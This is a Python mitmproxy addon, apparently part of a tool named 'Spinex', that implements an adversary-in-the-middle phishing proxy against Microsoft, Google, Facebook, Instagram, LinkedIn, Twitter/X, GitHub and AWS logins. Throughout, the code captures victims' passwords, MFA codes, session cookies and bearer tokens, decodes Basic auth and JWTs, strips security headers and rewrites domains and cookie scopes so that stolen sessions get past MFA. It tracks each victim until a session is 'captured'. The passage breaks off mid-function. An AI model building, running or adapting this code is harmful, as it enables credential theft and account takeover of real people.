from mitmproxy import http
import json
import datetime
import os
import sys
import traceback
import re
import base64
import gzip
import zlib
import hashlib
import threading

_THIS_DIR = os.path.dirname(os.path.abspath(__file__))
if _THIS_DIR not in sys.path:
    sys.path.insert(0, _THIS_DIR)

BASE_DIR  = os.path.dirname(_THIS_DIR)   # Spinex root
CREDS_DIR = os.path.join(BASE_DIR, "creds")
LOG_COOKIES  = os.path.join(CREDS_DIR, "aitm_cookies.json")
LOG_CREDS    = os.path.join(CREDS_DIR, "aitm_credentials.json")
LOG_HEADERS  = os.path.join(CREDS_DIR, "aitm_headers.json")
LOG_SESSIONS = os.path.join(CREDS_DIR, "aitm_sessions.json")
LOG_SKIPPED  = os.path.join(CREDS_DIR, "aitm_skipped.json")   # optional debug log
os.makedirs(CREDS_DIR, exist_ok=True)

DEBUG_SKIPPED = False

# ---------------------------------------------------------------------------
# AUTH COOKIE REGISTRY
#
# Structure:
#   platform_key -> {
#       "domains"  : list of domain substrings to match the response origin,
#       "cookies"  : list of exact cookie names that carry auth/session state,
#       "patterns" : list of regex patterns for cookie names (use sparingly),
#   }
#
# Priority logic (applied in order):
#   1. Domain match — only inspect cookies from relevant origins.
#   2. Exact name match — fast O(1) set lookup.
#   3. Pattern match — regex fallback for variable-name tokens (e.g. JWT variants).
#
# To add a new platform, just append a new entry.  No other code needs to change.
# ---------------------------------------------------------------------------
AUTH_COOKIE_REGISTRY = {

    "microsoft": {
        "domains": [
            "login.microsoft.com",
            "login.microsoftonline.com",
            "login.live.com",
            "account.microsoft.com",
            "outlook.live.com",
            "office.com",
        ],
        "cookies": {
            # Core Azure AD session cookies
            "ESTSAUTH",
            "ESTSAUTHPERSISTENT",
            "ESTSAUTHLIGHT",
            "MSISAuth",
            "MSISAuth1",
            "MSISAuthenticated",
            "MSISLoopDetectionCookie",
            "MSISAUTH",
            # Legacy / ADFS
            ".ASPXAUTH",
            "MSISSignOut",
            # MFA / SSPR state
            "MFA_TOTP",
            # General Microsoft session
            "MUID",
            "OIDCnonce",
            # Refresh / persistent tokens
            "ESTSSC",
        },
        "patterns": [
            r"^x-ms-",          # x-ms-gateway-slice, stsservicecookie, etc.
        ],
    },

    "google": {
        "domains": [
            "accounts.google.com",
            "google.com",
            "mail.google.com",
            "workspace.google.com",
        ],
        "cookies": {
            "SID", "HSID", "SSID", "APISID", "SAPISID",
            "NID", "SIDCC", "CONSENT",
            # Secure prefixed variants
            "__Secure-1PSID",
            "__Secure-3PSID",
            "__Secure-1PAPISID",
            "__Secure-3PAPISID",
            "__Secure-1PSIDCC",
            "__Secure-3PSIDCC",
            "__Host-1PLSID",
            "__Host-3PLSID",
        },
        "patterns": [],
    },

    "facebook": {
        "domains": [
            "facebook.com",
            "www.facebook.com",
            "m.facebook.com",
            "meta.com",
        ],
        "cookies": {
            "c_user",   # plaintext user ID — high value
            "xs",       # session secret
            "fr",       # tracking + auth
            "datr",     # device auth
            "sb",       # secure browser ID
            "wd",
            "dpr",
        },
        "patterns": [],
    },

    "instagram": {
        "domains": [
            "instagram.com",
            "www.instagram.com",
        ],
        "cookies": {
            "sessionid",        # primary auth cookie
            "ds_user_id",       # user ID
            "csrftoken",        # CSRF (needed alongside sessionid)
            "mid",
            "ig_did",
            "ig_nrcb",
            "rur",
        },
        "patterns": [],
    },

    "linkedin": {
        "domains": [
            "linkedin.com",
            "www.linkedin.com",
        ],
        "cookies": {
            "li_at",        # primary auth token
            "liap",         # auth presence
            "JSESSIONID",   # API CSRF
            "li_gc",
            "bcookie",
            "bscookie",
            "lidc",
        },
        "patterns": [],
    },

    "twitter": {
        "domains": [
            "twitter.com",
            "x.com",
            "api.twitter.com",
        ],
        "cookies": {
            "auth_token",   # primary session token
            "ct0",          # CSRF token (must be sent with auth_token)
            "twid",
            "kdt",
            "remember_checked_on",
            "guest_id",
        },
        "patterns": [],
    },

    "github": {
        "domains": [
            "github.com",
            "api.github.com",
        ],
        "cookies": {
            "user_session",
            "__Host-user_session_same_site",
            "dotcom_user",
            "logged_in",
            "tz",
            "_gh_sess",
        },
        "patterns": [],
    },

    "aws": {
        "domains": [
            "signin.aws.amazon.com",
            "console.aws.amazon.com",
        ],
        "cookies": {
            "aws-creds",
            "aws-userInfo",
            "aws-selectedRegion",
            "JSESSIONID",
            "aws-account-alias",
            "noflush",
        },
        "patterns": [
            r"^aws-",
        ],
    },

    # Applied when no domain-specific platform matched.
    "_generic": {
        "domains": [],   # empty = matches any domain not already matched above
        "cookies": {
            "session",
            "sessionid",
            "session_token",
            "access_token",
            "refresh_token",
            "id_token",
            "auth_token",
            "authtoken",
            "token",
            "jwt",
            "PHPSESSID",
            "JSESSIONID",
            "ASP.NET_SessionId",
            "connect.sid",   # Express/Node.js
            "remember_token",
            "remember_me",
            "_session_id",
            "user_session",
        },
        "patterns": [
            r"^jwt[_\-]",
            r"[_\-]token$",
            r"[_\-]session$",
            r"^auth[_\-]",
        ],
    },
}

# ---------------------------------------------------------------------------
# CREDENTIAL FIELD REGISTRY
#
# Maps each platform to the POST body field names that carry credentials.
# Split into three buckets so we know what was captured:
#   "username" — identity fields (email, login name, phone)
#   "password" — secret fields
#   "mfa"      — one-time codes, TOTP, push tokens
#
# Platform-specific names take priority; the "_generic" bucket covers
# everything else.
# ---------------------------------------------------------------------------
CRED_FIELD_REGISTRY = {

    # Azure AD / O365 login.microsoftonline.com uses its own field names
    "microsoft": {
        "username": {"loginfmt", "login_hint", "username"},
        "password": {"passwd", "Password"},
        "mfa":      {"otc", "accesspass", "mfaLastError", "sacxt"},
    },

    "google": {
        "username": {"identifier", "Email", "email"},
        "password": {"Passwd", "password"},
        "mfa":      {"totpPin", "idvPin", "challengeId", "pin"},
    },

    "facebook": {
        "username": {"email", "username"},
        "password": {"pass", "password", "encpass"},
        "mfa":      {"approvals_code", "mfa_code"},
    },

    # Instagram API uses JSON body
    "instagram": {
        "username": {"username"},
        "password": {"password", "enc_password"},
        "mfa":      {"verification_code", "identifier"},
    },

    "linkedin": {
        "username": {"session_key", "username", "email"},
        "password": {"session_password", "password"},
        "mfa":      {"pin", "challengeId"},
    },

    "twitter": {
        "username": {"username", "email", "phone_number"},
        "password": {"password"},
        "mfa":      {"challenge_response", "totp_code"},
    },

    "github": {
        "username": {"login"},
        "password": {"password"},
        "mfa":      {"app_otp", "otp", "sms_otp"},
    },

    "aws": {
        "username": {"email", "username", "accountId"},
        "password": {"password", "passwd"},
        "mfa":      {"mfacode", "totpUserCode", "mfa_totp_token"},
    },

    "_generic": {
        "username": {
            "username", "user", "login", "email", "mail",
            "user_name", "userid", "user_id", "identifier",
            "account", "handle", "phone", "mobile",
        },
        "password": {
            "password", "passwd", "pass", "pwd", "secret",
            "credential", "pin", "passphrase",
        },
        "mfa": {
            "otp", "totp", "mfa", "2fa", "twofa", "two_fa",
            "code", "token", "verification_code", "auth_code",
            "authenticator_code", "one_time_password",
            "sms_code", "backup_code",
        },
    },
}

# Pre-compile all regex patterns once at import time for performance
_COMPILED_REGISTRY = {}
for _platform, _cfg in AUTH_COOKIE_REGISTRY.items():
    _COMPILED_REGISTRY[_platform] = {
        "domains":  _cfg["domains"],
        "cookies":  _cfg["cookies"],
        "patterns": [re.compile(p, re.IGNORECASE) for p in _cfg.get("patterns", [])],
    }


def _match_platform(host: str) -> list[str]:
    """
    Return a list of platform keys whose domain list matches *host*.
    Always appends '_generic' as the last fallback.
    """
    matched = []
    for platform, cfg in _COMPILED_REGISTRY.items():
        if platform == "_generic":
            continue
        for domain in cfg["domains"]:
            if domain in host:
                matched.append(platform)
                break
    matched.append("_generic")
    return matched


def _is_auth_cookie(name: str, platforms: list[str]) -> tuple[bool, str]:
    """
    Return (True, platform_key) if *name* is considered an auth cookie for
    any of the given platforms, else (False, '').
    """
    for platform in platforms:
        cfg = _COMPILED_REGISTRY[platform]
        # 1. Exact match (fast path)
        if name in cfg["cookies"]:
            return True, platform
        # 2. Pattern match (slower, only if exact fails)
        for pattern in cfg["patterns"]:
            if pattern.search(name):
                return True, platform
    return False, ""

def convert_bytes(obj):
    """Recursively decode bytes → str so everything is JSON-serialisable."""
    if isinstance(obj, bytes):
        return obj.decode("utf-8", errors="replace")
    if isinstance(obj, dict):
        return {convert_bytes(k): convert_bytes(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [convert_bytes(i) for i in obj]
    if isinstance(obj, tuple):
        return tuple(convert_bytes(i) for i in obj)
    return obj


def _append_log(filename: str, entry: dict) -> None:
    """Append a JSON line to *filename*, creating the file if needed."""
    try:
        os.makedirs(os.path.dirname(filename), exist_ok=True)
        with open(filename, "a") as f:
            f.write(json.dumps(entry) + "\n")
    except Exception:
        traceback.print_exc()


def _classify_field(field_name: str, platforms: list[str]) -> str | None:
    """
    Return 'username', 'password', or 'mfa' if *field_name* is a credential
    field for any matched platform, else None.
    Platform-specific registries are checked before _generic.
    """
    for platform in platforms:
        cfg = CRED_FIELD_REGISTRY.get(platform)
        if not cfg:
            continue
        name_lower = field_name.lower()
        for bucket in ("username", "password", "mfa"):
            # Case-insensitive exact check against the set
            if field_name in cfg[bucket] or name_lower in {v.lower() for v in cfg[bucket]}:
                return bucket
    return None


def _parse_post_body(flow: http.HTTPFlow) -> dict:
    """
    Parse a POST request body into a flat {field: value} dict.
    Handles three content types:
      1. application/x-www-form-urlencoded  — HTML login forms
      2. application/json                   — SPA / API logins
      3. multipart/form-data                — rare but possible

    Returns an empty dict if the body is absent, non-POST, or unparseable.
    """
    if flow.request.method.upper() != "POST":
        return {}

    content_type = flow.request.headers.get("content-type", "").lower()
    raw = flow.request.content  # bytes

    if not raw:
        return {}

    if "application/x-www-form-urlencoded" in content_type:
        try:
            from urllib.parse import parse_qs
            decoded = raw.decode("utf-8", errors="replace")
            parsed  = parse_qs(decoded, keep_blank_values=True)
            # parse_qs returns lists; flatten to single values
            return {k: v[0] if len(v) == 1 else v for k, v in parsed.items()}
        except Exception:
            traceback.print_exc()
            return {}

    if "application/json" in content_type:
        try:
            decoded = raw.decode("utf-8", errors="replace")
            parsed  = json.loads(decoded)
            if isinstance(parsed, dict):
                return parsed
            # Some APIs send [{"key": ..., "value": ...}] arrays
            if isinstance(parsed, list):
                return {item.get("key", f"item_{i}"): item.get("value", "")
                        for i, item in enumerate(parsed) if isinstance(item, dict)}
        except Exception:
            traceback.print_exc()
            return {}

    if "multipart/form-data" in content_type:
        try:
            # Extract boundary from Content-Type header
            boundary_match = re.search(r"boundary=([^\s;]+)", content_type)
            if boundary_match:
                boundary = boundary_match.group(1).encode()
                fields   = {}
                # Split on boundary, parse each part for Content-Disposition
                for part in raw.split(b"--" + boundary):
                    if b"Content-Disposition" not in part:
                        continue
                    header_end = part.find(b"\r\n\r\n")
                    if header_end == -1:
                        continue
                    headers_raw = part[:header_end].decode("utf-8", errors="replace")
                    body        = part[header_end + 4:].rstrip(b"\r\n--")
                    name_match  = re.search(r'name="([^"]+)"', headers_raw)
                    if name_match:
                        field_name = name_match.group(1)
                        fields[field_name] = body.decode("utf-8", errors="replace")
                return fields
        except Exception:
            traceback.print_exc()
            return {}

    return {}


# ---------------------------------------------------------------------------
# AUTH HEADER REGISTRY
#
# Structure per platform:
#   "headers"  : exact header names (case-insensitive in HTTP but stored
#                lowercase for normalised matching)
#   "patterns" : regex patterns for header names (e.g. x-amz-*)
#
# The special "_authorization" key is handled separately because the
# Authorization header needs its *scheme* parsed (Bearer / Basic / AWS4 / Token).
# ---------------------------------------------------------------------------
AUTH_HEADER_REGISTRY = {

    "microsoft": {
        "domains": [
            "login.microsoft.com", "login.microsoftonline.com",
            "login.live.com", "graph.microsoft.com",
            "outlook.office365.com", "office.com",
        ],
        "headers": {
            # Graph API / MSAL tokens land here
            "authorization",
            # OBO / ADFS custom headers
            "x-ms-client-request-id",
        },
        "patterns": [r"^x-ms-"],
    },

    "google": {
        "domains": [
            "accounts.google.com", "oauth2.googleapis.com",
            "www.googleapis.com", "mail.google.com",
        ],
        "headers": {
            "authorization",
            "x-goog-authuser",
            "x-goog-api-key",
        },
        "patterns": [r"^x-goog-"],
    },

    "facebook": {
        "domains": ["graph.facebook.com", "api.facebook.com", "facebook.com"],
        "headers": {
            "authorization",
            "x-fb-friendly-name",
        },
        "patterns": [],
    },

    "instagram": {
        "domains": ["i.instagram.com", "instagram.com"],
        "headers": {
            "authorization",
            "x-ig-app-id",
            "x-ig-www-claim",
            "x-csrftoken",
        },
        "patterns": [r"^x-ig-"],
    },

    "twitter": {
        "domains": ["api.twitter.com", "api.x.com", "twitter.com", "x.com"],
        "headers": {
            "authorization",      # Bearer + OAuth1 both appear here
            "x-twitter-auth-type",
            "x-csrf-token",
        },
        "patterns": [],
    },

    "github": {
        "domains": ["api.github.com", "github.com"],
        "headers": {
            "authorization",     # "token ghp_..." or "Bearer ..."
            "x-github-token",
        },
        "patterns": [],
    },

    "aws": {
        "domains": [
            "signin.aws.amazon.com", "console.aws.amazon.com",
            "sts.amazonaws.com",
        ],
        "headers": {
            "authorization",          # AWS4-HMAC-SHA256 Credential=...
            "x-amz-security-token",   # temporary STS session token (very high value)
            "x-amz-date",
        },
        "patterns": [r"^x-amz-"],
    },

    "linkedin": {
        "domains": ["api.linkedin.com", "linkedin.com"],
        "headers": {
            "authorization",
            "csrf-token",
            "x-restli-protocol-version",
        },
        "patterns": [],
    },

    "_generic": {
        "domains": [],
        "headers": {
            "authorization",
            "x-auth-token",
            "x-api-key",
            "x-access-token",
            "x-id-token",
            "x-refresh-token",
            "x-csrf-token",
            "api-key",
            "token",
        },
        "patterns": [
            r"^x-auth-",
            r"^x-api-",
            r"[_-]token$",
        ],
    },
}

# Pre-compile header patterns
_COMPILED_HEADER_REGISTRY = {}
for _platform, _cfg in AUTH_HEADER_REGISTRY.items():
    _COMPILED_HEADER_REGISTRY[_platform] = {
        "domains":  _cfg["domains"],
        "headers":  _cfg["headers"],
        "patterns": [re.compile(p, re.IGNORECASE) for p in _cfg.get("patterns", [])],
    }


def _match_header_platform(host: str) -> list[str]:
    """Same domain-matching logic as _match_platform but for the header registry."""
    matched = []
    for platform, cfg in _COMPILED_HEADER_REGISTRY.items():
        if platform == "_generic":
            continue
        for domain in cfg["domains"]:
            if domain in host:
                matched.append(platform)
                break
    matched.append("_generic")
    return matched


def _is_auth_header(header_name: str, platforms: list[str]) -> bool:
    """Return True if header_name should be captured for any matched platform."""
    name_lower = header_name.lower()
    for platform in platforms:
        cfg = _COMPILED_HEADER_REGISTRY.get(platform)
        if not cfg:
            continue
        if name_lower in cfg["headers"]:
            return True
        for pattern in cfg["patterns"]:
            if pattern.search(name_lower):
                return True
    return False


def _decode_jwt(token: str) -> dict | None:
    """
    Base64-decode a JWT's header and payload sections (no verification).
    Returns {"header": {...}, "payload": {...}} or None on failure.
    Useful for extracting sub/email/oid/tid from Microsoft/Google tokens.
    """
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return None

        decoded = {}
        for i, label in enumerate(("header", "payload")):
            # JWT uses base64url without padding — add padding back
            segment = parts[i]
            segment += "=" * (-len(segment) % 4)
            decoded[label] = json.loads(base64.urlsafe_b64decode(segment))
        return decoded
    except Exception:
        return None


def _parse_authorization_header(value: str) -> dict:
    """
    Parse the Authorization header value into structured fields.

    Handles:
      Bearer <jwt_or_opaque>   — OAuth2 / OIDC
      Basic <base64>           — HTTP Basic Auth (decodes user:pass)
      Token <value>            — GitHub PAT style
      AWS4-HMAC-SHA256 ...     — AWS Signature v4
      OAuth <params>           — OAuth 1.0a (Twitter legacy)
    """
    result = {"raw": value}

    if not value:
        return result

    scheme, _, rest = value.partition(" ")
    scheme = scheme.lower()
    result["scheme"] = scheme

    if scheme == "bearer":
        result["token"] = rest.strip()
        jwt_data = _decode_jwt(rest.strip())
        if jwt_data:
            result["jwt_decoded"] = jwt_data
            # Surface the most useful identity claims at the top level
            payload = jwt_data.get("payload", {})
            for claim in ("sub", "email", "upn", "preferred_username",
                          "oid", "tid", "azp", "iss", "exp", "scp", "scope"):
                if claim in payload:
                    result[claim] = payload[claim]

    elif scheme == "basic":
        try:
            decoded = base64.b64decode(rest.strip()).decode("utf-8", errors="replace")
            user, _, password = decoded.partition(":")
            result["username"] = user
            result["password"] = password
        except Exception:
            result["raw_basic"] = rest

    elif scheme == "token":
        result["token"] = rest.strip()

    elif scheme == "aws4-hmac-sha256":
        # Credential=AKIAIOSFODNN7EXAMPLE/20130524/us-east-1/s3/aws4_request
        cred_match = re.search(r"Credential=([^,\s]+)", value)
        sig_match  = re.search(r"Signature=([^,\s]+)", value)
        if cred_match:
            result["credential"] = cred_match.group(1)
        if sig_match:
            result["signature"] = sig_match.group(1)

    elif scheme == "oauth":
        # Extract oauth_token and oauth_consumer_key
        for param in ("oauth_token", "oauth_consumer_key", "oauth_signature"):
            m = re.search(rf'{param}="([^"]+)"', value)
            if m:
                result[param] = m.group(1)

    return result


def _extract_auth_headers(flow: http.HTTPFlow, platforms: list[str]) -> dict:
    """
    Walk all request headers and return a dict of captured auth headers.
    The Authorization header gets special parsed treatment; others are
    captured as raw values.

    Returns {} if nothing worth logging was found.
    """
    captured = {}

    for header_name, header_value in flow.request.headers.items():
        header_name  = convert_bytes(header_name)
        header_value = convert_bytes(header_value)

        if not _is_auth_header(header_name, platforms):
            continue

        name_lower = header_name.lower()

        if name_lower == "authorization":
            parsed = _parse_authorization_header(header_value)
            # Skip trivial / empty Authorization headers
            if parsed.get("scheme") in (None, "") and not parsed.get("token"):
                continue
            captured["authorization"] = parsed
        else:
            captured[header_name] = header_value

    return captured


# ---------------------------------------------------------------------------
# DOMAIN MAP  — loaded from spinex_config.json via config_manager
#
# To configure: edit spinex_config.json (or use the Streamlit config page)
# and set your base domain + enable target platforms.
# config_manager.generate_domain_map() builds this dict automatically.
#
# Falls back to an empty dict (rewriting disabled) if config is missing
# or no platforms are enabled — safe to run without config for testing.
# ---------------------------------------------------------------------------
try:
    import config_manager as _cm
    _spinex_cfg = _cm.load()
    DOMAIN_MAP: dict[str, str] = _cm.generate_domain_map(_spinex_cfg)
    if DOMAIN_MAP:
        print(f"[Spinex] Loaded {len(DOMAIN_MAP)} domain mappings from spinex_config.json")
    else:
        print("[Spinex] No domain mappings configured — rewriting disabled. Set base domain in config.")
except Exception:
    print("[Spinex] Could not load config_manager — falling back to empty DOMAIN_MAP.")
    DOMAIN_MAP: dict[str, str] = {}

# Inverted map: proxy domain → real domain (built automatically)
_REVERSE_DOMAIN_MAP: dict[str, str] = {v: k for k, v in DOMAIN_MAP.items()}

# ---------------------------------------------------------------------------
# Security headers to strip so the browser doesn't block our rewriting
# ---------------------------------------------------------------------------
_STRIP_RESPONSE_HEADERS = {
    "content-security-policy",
    "content-security-policy-report-only",
    "x-frame-options",
    "x-content-type-options",
    "strict-transport-security",
    "public-key-pins",
    "public-key-pins-report-only",
    "expect-ct",
    "cross-origin-opener-policy",
    "cross-origin-embedder-policy",
    "cross-origin-resource-policy",
}

# Content-type groups
_HTML_TYPES = {"text/html", "application/xhtml+xml"}
_JS_TYPES   = {"application/javascript", "text/javascript",
               "application/x-javascript", "module"}
_CSS_TYPES  = {"text/css"}

# HTML attributes whose values are URLs
_URL_ATTRIBUTES = re.compile(
    r"""((?:href|src|action|data-url|data-href|data-src|content|srcset|poster|"""
    r"""formaction|ping|manifest|codebase)\s*=\s*['"])([^'"]+)(['"])""",
    re.IGNORECASE | re.VERBOSE,
)
_META_REFRESH = re.compile(
    r"(content\s*=\s*['\"][\d.]+;\s*url\s*=\s*)([^'\"]+)(['\"])",
    re.IGNORECASE,
)
_CSS_URL = re.compile(r"(url\s*\(\s*['\"]?)([^'\")]+)(['\"]?\s*\))", re.IGNORECASE)

def _decompress_body(flow: http.HTTPFlow) -> bytes | None:
    """
    Decompress response body and remove Content-Encoding header.
    Handles gzip, deflate, brotli, and identity.
    """
    raw = flow.response.raw_content
    if not raw:
        return None

    encoding = flow.response.headers.get("content-encoding", "").lower()

    try:
        if "gzip" in encoding:
            body = gzip.decompress(raw)
        elif "deflate" in encoding:
            try:
                body = zlib.decompress(raw)
            except zlib.error:
                body = zlib.decompress(raw, -zlib.MAX_WBITS)
        elif "br" in encoding:
            try:
                import brotli  # type: ignore
                body = brotli.decompress(raw)
            except ImportError:
                return None
        else:
            body = raw

        if encoding:
            del flow.response.headers["content-encoding"]

        return body
    except Exception:
        traceback.print_exc()
        return None

def _replace_domains(text: str) -> str:
    """
    Replace all real upstream domains with their proxy counterparts.
    Handles https://, http://, //, and bare domain occurrences.
    """
    if not DOMAIN_MAP:
        return text
    for real, proxy in DOMAIN_MAP.items():
        text = text.replace(f"https://{real}", f"https://{proxy}")
        text = text.replace(f"http://{real}",  f"http://{proxy}")
        text = text.replace(f"//{real}",        f"//{proxy}")
        text = text.replace(real,               proxy)
    return text


def _rewrite_set_cookie_domain(flow: http.HTTPFlow) -> None:
    """
    Rewrite the Domain= attribute in Set-Cookie headers so cookies are scoped
    to the proxy domain, not the real domain.
    """
    if not DOMAIN_MAP:
        return
    new_headers = []
    for name, value in flow.response.headers.items(multi=True):
        if name.lower() == "set-cookie":
            for real, proxy in DOMAIN_MAP.items():
                value = re.sub(
                    rf"(domain\s*=\s*)\.?{re.escape(real)}",
                    rf"\g<1>.{proxy}",
                    value,
                    flags=re.IGNORECASE,
                )
        new_headers.append((name, value))
    flow.response.headers.clear()
    for name, value in new_headers:
        flow.response.headers.add(name, value)


def _rewrite_location_header(flow: http.HTTPFlow) -> None:
    """Keep redirect Location headers pointing at the proxy, not the real site."""
    location = flow.response.headers.get("location", "")
    if location:
        new_location = _replace_domains(location)
        if new_location != location:
            flow.response.headers["location"] = new_location

def _rewrite_html(body: str) -> str:
    """Rewrite HTML: URL attributes, meta-refresh, inline scripts/styles."""
    if not DOMAIN_MAP:
        return body

    def replace_attr(m: re.Match) -> str:
        return m.group(1) + _replace_domains(m.group(2)) + m.group(3)

    def replace_meta(m: re.Match) -> str:
        return m.group(1) + _replace_domains(m.group(2)) + m.group(3)

    body = _URL_ATTRIBUTES.sub(replace_attr, body)
    body = _META_REFRESH.sub(replace_meta, body)

    # Inline <script> blocks
    def replace_script(m: re.Match) -> str:
        return m.group(1) + _rewrite_js(m.group(2)) + m.group(3)

    body = re.sub(
        r"(<script[^>]*>)(.*?)(</script>)",
        replace_script,
        body,
        flags=re.DOTALL | re.IGNORECASE,
    )

    # Inline <style> blocks
    def replace_style(m: re.Match) -> str:
        return m.group(1) + _rewrite_css(m.group(2)) + m.group(3)

    body = re.sub(
        r"(<style[^>]*>)(.*?)(</style>)",
        replace_style,
        body,
        flags=re.DOTALL | re.IGNORECASE,
    )

    # Catch-all for remaining bare domain refs in data-* attrs / text nodes
    body = _replace_domains(body)
    return body


def _rewrite_js(js: str) -> str:
    """Rewrite domain references inside JavaScript."""
    if not DOMAIN_MAP:
        return js
    return _replace_domains(js)


def _rewrite_css(css: str) -> str:
    """Rewrite url() references inside CSS."""
    if not DOMAIN_MAP:
        return css

    def replace_css_url(m: re.Match) -> str:
        return m.group(1) + _replace_domains(m.group(2)) + m.group(3)

    return _CSS_URL.sub(replace_css_url, css)


def _rewrite_response(flow: http.HTTPFlow) -> None:
    """
    Full response rewrite pipeline:
      1. Strip security headers (CSP, HSTS, X-Frame-Options, COOP, …)
      2. Rewrite Set-Cookie Domain attributes
      3. Rewrite Location redirect header
      4. Decompress body
      5. Rewrite body (HTML / JS / CSS / JSON) based on Content-Type
      6. Write back plain UTF-8 body with updated Content-Length
    """
    if not DOMAIN_MAP:
        return

    # 1. Strip restrictive headers
    for header in list(flow.response.headers.keys()):
        if header.lower() in _STRIP_RESPONSE_HEADERS:
            del flow.response.headers[header]

    # 2. Cookie domain rewrite
    _rewrite_set_cookie_domain(flow)

    # 3. Redirect rewrite
    _rewrite_location_header(flow)

    # Determine content type
    content_type = flow.response.headers.get("content-type", "").lower()
    ct_base      = content_type.split(";")[0].strip()

    needs_rewrite = (
        ct_base in _HTML_TYPES or
        ct_base in _JS_TYPES   or
        ct_base in _CSS_TYPES  or
        "json" in ct_base
    )
    if not needs_rewrite:
        return

    # 4. Decompress
    body_bytes = _decompress_body(flow)
    if not body_bytes:
        return

    charset = "utf-8"
    charset_match = re.search(r"charset\s*=\s*([\w-]+)", content_type)
    if charset_match:
        charset = charset_match.group(1)

    try:
        body_str = body_bytes.decode(charset, errors="replace")
    except (LookupError, UnicodeDecodeError):
        body_str = body_bytes.decode("utf-8", errors="replace")

    # 5. Rewrite
    if ct_base in _HTML_TYPES:
        body_str = _rewrite_html(body_str)
    elif ct_base in _JS_TYPES:
        body_str = _rewrite_js(body_str)
    elif ct_base in _CSS_TYPES:
        body_str = _rewrite_css(body_str)
    else:
        body_str = _replace_domains(body_str)

    # 6. Write back
    flow.response.content = body_str.encode("utf-8", errors="replace")
    flow.response.headers["content-length"] = str(len(flow.response.content))


# ---------------------------------------------------------------------------
# SESSION STORE  (Step 5 — victim / session correlation)
#
# Every victim gets a unique session_id derived from their IP + User-Agent.
# As credentials, cookies, and headers are captured across separate hooks,
# they're all merged into one session record.
#
# Session status lifecycle:
#   "new"       → first request seen, nothing captured yet
#   "active"    → credentials (POST) or auth headers have been captured
#   "captured"  → auth cookies received after credentials → MFA bypassed,
#                  full session stolen — this is the terminal success state
#
# The in-memory store is flushed to disk (aitm_sessions.json) on every
# meaningful update so progress isn't lost if mitmproxy is interrupted.
# ---------------------------------------------------------------------------

def _get_victim_ip(flow: http.HTTPFlow) -> str:
    """
    Return the real client IP.  Prefers X-Forwarded-For if present
    (useful when mitmproxy sits behind a reverse proxy or load balancer).
    """
    xff = flow.request.headers.get("x-forwarded-for", "")
    if xff:
        return xff.split(",")[0].strip()
    if flow.client_conn and flow.client_conn.peername:
        return flow.client_conn.peername[0]
    return "unknown"


def _make_session_id(ip: str, user_agent: str) -> str:
    """
    Derive a stable 16-char hex session ID from IP + User-Agent.
    Collision probability is negligible for any realistic number of victims.
    """
    fingerprint = f"{ip}::{user_agent}".encode("utf-8", errors="replace")
    return hashlib.sha256(fingerprint).hexdigest()[:16]


class SessionStore:
    """
    Thread-safe in-memory store for victim session records.

    Each record has the shape:
    {
        "id":          "a3f1c8e2b04d9f71",   # 16-char hex
        "status":      "new|active|captured",
        "ip":          "1.2.3.4",
        "user_agent":  "Mozilla/5.0 ...",
        "platform":    "microsoft",
        "first_seen":  "2026-05-12 ...",
        "last_seen":   "2026-05-12 ...",
        "credentials": [                      # from Step 2 — POST bodies
            {
                "timestamp": "...",
                "url":       "...",
                "username":  {"loginfmt": "victim@company.com"},
                "password":  {"passwd": "hunter2"},
                "mfa":       {},
            },
            ...
        ],
        "cookies": [                          # from Step 1 — Set-Cookie headers
            {
                "timestamp": "...",
                "url":       "...",
                "cookies":   {"ESTSAUTH": {"value": "...", "platform": "microsoft"}},
            },
            ...
        ],
        "auth_headers": [                     # from Step 3 — outbound headers
            {
                "timestamp": "...",
                "method":    "GET",
                "url":       "...",
                "headers":   {"authorization": {"scheme": "bearer", ...}},
            },
            ...
        ],
    }
    """

    def __init__(self) -> None:
        self._store: dict[str, dict] = {}
        self._lock  = threading.Lock()

    def _now(self) -> str:
        return str(datetime.datetime.now())

    def _get_or_create(self, flow: http.HTTPFlow) -> dict:
        """Return the existing session record for this victim, or create one."""
        ip         = _get_victim_ip(flow)
        user_agent = flow.request.headers.get("user-agent", "unknown")
        sid        = _make_session_id(ip, user_agent)

        if sid not in self._store:
            self._store[sid] = {
                "id":           sid,
                "status":       "new",
                "ip":           ip,
                "user_agent":   user_agent,
                "platform":     "unknown",
                "first_seen":   self._now(),
                "last_seen":    self._now(),
                "credentials":  [],
                "cookies":      [],
                "auth_headers": [],
            }
        else:
            self._store[sid]["last_seen"] = self._now()

        return self._store[sid]

    def _advance_status(self, session: dict) -> None:
        """
        Promote status based on what's been collected so far.

          has credentials AND has auth cookies → "captured"  (full session stolen)
          has credentials OR  has auth headers → "active"    (in progress)
          nothing yet                          → "new"
        """
        has_creds   = bool(session["credentials"])
        has_cookies = bool(session["cookies"])
        has_headers = bool(session["auth_headers"])

        if has_creds and has_cookies:
            session["status"] = "captured"
        elif has_creds or has_headers:
            session["status"] = "active"
        else:
            session["status"] = "new"

    def _flush(self, session: dict) -> None:
        """Write the current state of one session to disk (append/overwrite)."""
        try:
            # Load existing sessions file into a dict keyed by session id
            existing: dict[str, dict] = {}
            if os.path.exists(LOG_SESSIONS):
                with open(LOG_SESSIONS, "r") as f:
                    for line in f:
                        line = line.strip()
                        if line:
                            try:
                                rec = json.loads(line)
                                existing[rec["id"]] = rec
                            except Exception:
                                pass

            # Overwrite this session's entry
            existing[session["id"]] = session

            # Rewrite the whole file (keeps it as one-record-per-line JSONL)
            with open(LOG_SESSIONS, "w") as f:
                for rec in existing.values():
                    f.write(json.dumps(rec) + "\n")

        except Exception:
            traceback.print_exc()

    def update_credentials(
        self,
        flow: http.HTTPFlow,
        url: str,
        platform: str,
        captured: dict,
    ) -> None:
        """Record a POST credential capture and update session status."""
        with self._lock:
            session = self._get_or_create(flow)
            if session["platform"] == "unknown" and platform != "unknown":
                session["platform"] = platform

            session["credentials"].append({
                "timestamp": self._now(),
                "url":       url,
                "username":  captured.get("username", {}),
                "password":  captured.get("password", {}),
                "mfa":       captured.get("mfa", {}),
            })
            self._advance_status(session)
            self._flush(session)

    def update_cookies(
        self,
        flow: http.HTTPFlow,
        url: str,
        platform: str,
        auth_cookies: dict,
    ) -> None:
        """Record captured Set-Cookie tokens and update session status."""
        with self._lock:
            session = self._get_or_create(flow)
            if session["platform"] == "unknown" and platform != "unknown":
                session["platform"] = platform

            session["cookies"].append({
                "timestamp": self._now(),
                "url":       url,
                "cookies":   auth_cookies,
            })
            self._advance_status(session)

            # Print a conspicuous alert when a session becomes fully captured
